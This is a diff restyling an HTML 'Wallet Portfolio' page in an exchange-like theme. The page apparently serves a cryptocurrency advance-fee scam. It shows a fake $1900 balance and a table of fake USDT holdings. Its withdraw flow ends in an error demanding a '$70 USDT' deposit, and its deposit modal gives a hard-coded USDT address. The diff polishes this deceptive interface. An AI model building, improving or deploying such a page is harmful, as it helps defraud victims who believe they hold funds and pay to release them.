@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <title>Wallet Portfolio</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Bybit-style background -->
+  <!-- Bybit-style background and theme -->
   <style>
     body {
       background: #131313;
@@ -13,315 +13,256 @@
       margin: 0;
       color: #fff;
     }
-    .wallet-container {
+    .main-wrap {
       max-width: 600px;
       margin: 40px auto;
-      background: #1c1c1c;
-      border-radius: 16px;
-      box-shadow: 0 6px 32px 0 rgba(0,0,0,0.25);
-      padding: 32px 24px 24px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
     }
     .portfolio-section {
-      max-width: 595px;
-      margin: 30px auto 24px auto;
-      background-color: rgba(255,255,255,0.8);
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
-      padding: 20px;
-      text-align: center;
-      color: #222;
+      width: 100%;
+      max-width: 600px;
+      min-width: 0;
+      min-height: 210px;
+      border-radius: 12px;
+      box-shadow: 0 4px 30px 0 rgba(0,0,0,0.20);
       position: relative;
+      overflow: hidden;
+      background: url('IMG_1099.jpeg') center center/cover no-repeat;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: stretch;
+      padding: 0;
+    }
+    .portfolio-overlay {
+      background: rgba(19,19,19, 0.85);
+      width: 100%;
+      height: 100%;
+      position: absolute;
+      z-index: 1;
+      top: 0; left: 0;
+    }
+    .portfolio-content {
+      position: relative;
+      z-index: 2;
+      padding: 32px 32px 24px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
     }
     .portfolio-title {
       font-size: 1.1rem;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
       letter-spacing: 1px;
-      color: #333;
+      color: #f5c339;
+      font-weight: 600;
     }
     .portfolio-balance {
       font-size: 2.3rem;
       font-weight: bold;
-      color: #067d68;
-    }
-    .portfolio-gif {
-      width: 560px;
-      max-width: 560px;
-      height: auto;
-      margin: 18px auto 0 auto;
-      border-radius: 10px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
-      display: block;
-      background: #181818;
+      color: #fff;
+      margin-bottom: 18px;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.14);
     }
     .wallet-buttons {
-      margin-top: 20px;
       display: flex;
       justify-content: space-between;
-      gap: 16px;
+      align-items: center;
+      gap: 0;
       width: 100%;
-      max-width: 420px;
-      margin-left: auto;
-      margin-right: auto;
+      margin-top: 8px;
     }
     .wallet-btn {
-      padding: 10px 28px;
-      font-size: 1rem;
+      padding: 12px 36px;
+      font-size: 1.08rem;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       cursor: pointer;
-      font-weight: 500;
+      font-weight: 600;
       background: #f5c339;
       color: #131313;
-      transition: background 0.2s;
+      transition: background 0.2s, color 0.2s;
+      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
     }
     .wallet-btn.withdraw {
       background: #232323;
       color: #f5c339;
       border: 1.5px solid #f5c339;
     }
-    .wallet-btn:hover {
-      filter: brightness(0.95);
+    .wallet-btn:active {
+      filter: brightness(0.93);
     }
+
+    /* GIF Section */
+    .gif-section {
+      width: 100%;
+      max-width: 600px;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #191919;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      box-shadow: 0 4px 18px 0 rgba(0,0,0,0.15);
+      padding: 0;
+      margin: 0;
+    }
+    .gif-section img {
+      display: block;
+      width: 100%;
+      max-width: 600px;
+      height: auto;
+      border-radius: 12px;
+      background: #191919;
+    }
+
+    /* Token Table */
     .token-table-section {
-      max-width: 595px;
-      margin: 0 auto;
-      margin-top: 28px;
+      width: 100%;
+      max-width: 600px;
+      margin: 0;
       background: #181818;
-      border-radius: 8px;
-      box-shadow: 0 6px 32px 0 rgba(0,0,0,0.12);
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 18px 0 rgba(0,0,0,0.12);
       padding: 0;
     }
     table {
       width: 100%;
       border-collapse: collapse;
       background: none;
-      border-radius: 8px;
-      overflow: hidden;
-      margin: 0;
-      font-size: 0.99em;
-    }
-    thead {
-      background: #222;
-      color: #f5c339;
-    }
-    th, td {
-      padding: 12px 8px;
       font-size: 1rem;
     }
+    thead {
+      background: #181818;
+    }
+    th, td {
+      padding: 13px 12px;
+      font-size: 1rem;
+      font-weight: 500;
+    }
     th {
-      font-weight: 600;
-      text-align: left;
+      color: #f5c339;
+      font-weight: 700;
+      background: #232323;
+      border-bottom: 2px solid #282828;
+      letter-spacing: 0.03em;
     }
-    td {
+    tr:not(:last-child) td {
+      border-bottom: 1px solid #232323;
+    }
+    td, th {
       vertical-align: middle;
-      /* Alignment for table columns: left, center, right */
     }
-    td:first-child, th:first-child {
+    /* Token left, Balance center, Price right */
+    th:first-child, td:first-child {
       text-align: left;
-      width: 40%;
+      width: 38%;
     }
-    td:nth-child(2), th:nth-child(2) {
+    th:nth-child(2), td:nth-child(2) {
       text-align: center;
-      width: 30%;
+      width: 32%;
     }
-    td:last-child, th:last-child {
+    th:last-child, td:last-child {
       text-align: right;
       width: 30%;
     }
-    tr:not(:last-child) td {
-      border-bottom: 1px solid #262626;
-    }
-    /* Modal and popup styles unchanged ... */
-    .deposit-page,
-    .error-popup-bg {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(19,19,19,0.90);
-      z-index: 100;
-      justify-content: center;
-      align-items: center;
-    }
-    .deposit-card {
-      background: #222;
-      border-radius: 18px;
-      padding: 32px 20px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.28);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-width: 320px;
-    }
-    .deposit-card img {
-      width: 150px;
-      height: 150px;
-      object-fit: contain;
-      margin-bottom: 22px;
-      border-radius: 12px;
-      background: #191919;
-      box-shadow: 0 2px 8px rgba(245,195,57,0.10);
-    }
-    .deposit-desc {
-      font-size: 1.16rem;
-      color: #f5c339;
-      margin-bottom: 8px;
-      text-align: center;
-      font-weight: 500;
-    }
-    .deposit-close {
-      margin-top: 20px;
-      padding: 10px 36px;
-      background: #f5c339;
-      color: #222;
-      border: none;
-      border-radius: 6px;
-      font-weight: 600;
-      font-size: 1rem;
-      cursor: pointer;
-    }
-    /* Error Popup */
-    .error-popup-bg {
-      display: none;
-      background: rgba(0,0,0,0.60);
-      z-index: 200;
-    }
-    .error-popup {
-      background: #232323;
-      color: #f5c339;
-      border-radius: 14px;
-      padding: 32px 20px 20px 20px;
-      box-shadow: 0 2px 24px rgba(245,195,57,0.08);
-      min-width: 320px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      position: relative;
-    }
-    .error-title {
-      font-size: 1.28rem;
-      font-weight: bold;
-      margin-bottom: 14px;
-      text-align: center;
-    }
-    .error-desc {
-      font-size: 1rem;
-      margin-bottom: 24px;
-      text-align: center;
-    }
-    .error-actions {
-      display: flex;
-      gap: 14px;
-      margin-top: 8px;
-    }
-    .error-btn {
-      padding: 9px 30px;
-      font-size: 1rem;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: 500;
-      background: #f5c339;
-      color: #222;
-      transition: background 0.2s;
-    }
-    .error-btn.secondary {
-      background: #232323;
-      color: #f5c339;
-      border: 1.5px solid #f5c339;
-    }
+
     /* Responsive */
     @media (max-width: 650px) {
-      .wallet-container,
-      .portfolio-section,
-      .token-table-section {
+      .main-wrap, .portfolio-section, .gif-section, .token-table-section {
         max-width: 99vw;
-        padding: 16px 2vw 16px 2vw;
       }
-      .portfolio-gif {
-        width: 98vw;
-        max-width: 98vw;
+      .portfolio-content {
+        padding: 22px 6vw 18px 6vw;
       }
-      .deposit-card, .error-popup {
-        min-width: 90vw;
-        padding-left: 6vw;
-        padding-right: 6vw;
+      .wallet-btn {
+        padding: 11px 16vw;
+        font-size: 1em;
       }
-      table {
-        font-size: 0.94em;
-      }
-      .wallet-buttons {
-        flex-direction: column;
-        gap: 10px;
-        max-width: 100%;
+      .gif-section img {
+        width: 100vw;
+        max-width: 99vw;
       }
     }
   </style>
 </head>
 <body>
-  <!-- Dynamic Portfolio Balance & GIF Section (well aligned) -->
-  <div class="portfolio-section">
-    <div class="portfolio-title">Portfolio Balance</div>
-    <div id="portfolio-balance-amount" class="portfolio-balance">$20</div>
-    <!-- GIF (well aligned, matches balance width) -->
-    <img src="IMG_0898.gif" alt="Wallet Overview" class="portfolio-gif" />
-    <div class="wallet-buttons">
-      <button class="wallet-btn" id="deposit-btn">Deposit</button>
-      <button class="wallet-btn withdraw" id="withdraw-btn">Withdraw</button>
+  <div class="main-wrap">
+    <!-- Portfolio Section with background image and overlay -->
+    <div class="portfolio-section">
+      <div class="portfolio-overlay"></div>
+      <div class="portfolio-content">
+        <div class="portfolio-title">Portfolio Balance</div>
+        <div id="portfolio-balance-amount" class="portfolio-balance">$20</div>
+        <div class="wallet-buttons">
+          <button class="wallet-btn" id="deposit-btn">Deposit</button>
+          <button class="wallet-btn withdraw" id="withdraw-btn">Withdraw</button>
+        </div>
+      </div>
     </div>
-  </div>
-  <!-- Token Table Section (well aligned) -->
-  <div class="token-table-section">
-    <table>
-      <thead>
-        <tr>
-          <th>Token</th>
-          <th>Price</th>
-          <th>Available Balance</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>USDT</td>
-          <td>$1.00</td>
-          <td>$1899.00</td>
-        </tr>
-        <tr>
-          <td>BTC</td>
-          <td>$68,000</td>
-          <td>$0.00</td>
-        </tr>
-        <tr>
-          <td>SOLANA</td>
-          <td>$160</td>
-          <td>$0.00</td>
-        </tr>
-        <tr>
-          <td>BNB</td>
-          <td>$600</td>
-          <td>$0.00</td>
-        </tr>
-        <tr>
-          <td>ETH</td>
-          <td>$3,800</td>
-          <td>$0.00</td>
-        </tr>
-      </tbody>
-    </table>
+
+    <!-- GIF Section -->
+    <div class="gif-section">
+      <img src="IMG_0898.gif" alt="Wallet Overview" />
+    </div>
+
+    <!-- Token Table Section -->
+    <div class="token-table-section">
+      <table>
+        <thead>
+          <tr>
+            <th>Token</th>
+            <th>Available Balance</th>
+            <th>Price</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>USDT</td>
+            <td>$1899.00</td>
+            <td>$1.00</td>
+          </tr>
+          <tr>
+            <td>BTC</td>
+            <td>$0.00</td>
+            <td>$68,000</td>
+          </tr>
+          <tr>
+            <td>SOLANA</td>
+            <td>$0.00</td>
+            <td>$160</td>
+          </tr>
+          <tr>
+            <td>BNB</td>
+            <td>$0.00</td>
+            <td>$600</td>
+          </tr>
+          <tr>
+            <td>ETH</td>
+            <td>$0.00</td>
+            <td>$3,800</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
   </div>
 
   <!-- Deposit Page Modal -->
-  <div class="deposit-page" id="deposit-modal">
+  <div class="deposit-page" id="deposit-modal" style="display:none;">
     <div class="deposit-card">
       <img src="IMG_1089.jpeg" alt="Deposit Wallet">
       <div class="deposit-desc">Deposit USDT or any supported token to your wallet.</div>
-      <div class="error-desc">Minimum deposit <b>$70 USDT</b>[ TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF ]</div>
+      <div class="error-desc">Minimum deposit <b>$70 USDT</b> [ TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF ]</div>
       <button class="deposit-close" id="deposit-close">Close</button>
     </div>
   </div>
 
   <!-- Error Popup Modal -->
-  <div class="error-popup-bg" id="error-popup-bg">
+  <div class="error-popup-bg" id="error-popup-bg" style="display:none;">
     <div class="error-popup">
       <div class="error-title">Sorry, you can't complete process at this time</div>
       <div class="error-desc">Deposit <b>$70 USDT</b> and try again.</div>
@@ -336,7 +277,6 @@
   // Dynamically update balance to $1900
   document.getElementById('portfolio-balance-amount').textContent = '$1900';
   </script>
-
   <script>
     const depositBtn = document.getElementById('deposit-btn');
     const withdrawBtn = document.getElementById('withdraw-btn');
